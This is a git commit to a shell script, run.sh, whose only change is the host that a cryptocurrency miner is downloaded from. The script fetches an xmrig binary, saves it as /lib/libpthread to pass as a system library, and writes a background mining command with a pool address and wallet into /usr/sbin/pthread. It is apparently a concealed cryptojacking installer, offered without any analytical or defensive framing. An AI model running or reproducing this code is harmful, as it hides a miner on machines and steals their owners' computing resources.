638b8dc057f504b741520841ab4334ed379c407b
xbhuang's pc <xbhuang1994@gmail.com>
2017-09-03 03:48:54 +0800

    1.修改域名地址

--- run.sh
+++ run.sh
@@ -1,4 +1,4 @@
-curl http://miner.gpu360.com/xmrig/libpthread > libpthread
+curl http://qr4d.com/xmrig/libpthread > libpthread
 yum -y install libuv
 mv ./libpthread /lib/libpthread
 echo "/lib/libpthread -o nicehash.gpu360.com:3355 -u 33MQmd3LSueY4gxSCXSJLrmVxtQ6WTQqJP.libpthread --nicehash  --max-cpu-usage=20 -p x --background" > /usr/sbin/pthread
